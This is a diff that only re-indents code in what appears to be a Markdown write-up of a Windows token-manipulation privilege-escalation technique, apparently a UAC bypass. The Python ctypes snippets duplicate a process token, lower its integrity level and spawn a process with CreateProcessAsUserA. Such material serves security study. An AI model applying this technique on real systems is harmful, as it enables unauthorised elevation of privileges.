@@ -46,7 +46,7 @@ Open the token with TOKEN_DUPLICATE and TOKEN_QUERY access
 ```python
 token = ctypes.c_void_p(ctypes.c_void_p(-1).value)
 if ctypes.windll.ntdll.NtOpenProcessToken(shinfo.hProcess, (TOKEN_DUPLICATE | TOKEN_QUERY),
-											ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
+					ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
 	print "[-] Unable to open process token using NtOpenProcessToken"
 	return False
 else:
@@ -57,7 +57,7 @@ Duplicate primary token with TOKEN_ALL_ACCESS access
 ```python
 dtoken = ctypes.c_void_p(ctypes.c_void_p(-1).value)
 if ctypes.windll.ntdll.NtDuplicateToken(token, TOKEN_ALL_ACCESS, None, False,
-										TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
+					TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
 	print "[-] Unable to duplicate token using NtDuplicateToken"
 	return False
 else:
@@ -70,7 +70,7 @@ mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
 pIntegritySid = ctypes.c_void_p()
 
 if ctypes.windll.ntdll.RtlAllocateAndInitializeSid(ctypes.byref(mlAuthority), 1, IntegrityLevel.MEDIUM_RID,
-													0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
+					0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
 	print "[-] Unable to Initialize Medium SID using RtlAllocateAndInitializeSid"
 	return False
 else:
@@ -84,7 +84,7 @@ tml = TOKEN_MANDATORY_LABEL()
 tml.Label = saa
 
 if ctypes.windll.ntdll.NtSetInformationToken(dtoken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
-											ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
+					ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
 	print "[-] Unable to lower duplicated token IL from Medium+ to Medium using NtSetInformationToken"
 	return False
 else:
@@ -102,8 +102,7 @@ lpProcessInformation = PROCESS_INFORMATION()
 lpApplicationName = "notepad.exe" # Path to executable that controls High IL process
 
 if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationName, None, None, False,
-													(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo),
-													ctypes.byref(lpProcessInformation)):
+						(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo), ctypes.byref(lpProcessInformation)):
 	print "[-] Unable to create process using CreateProcessAsUserA"
 	return False
 else:
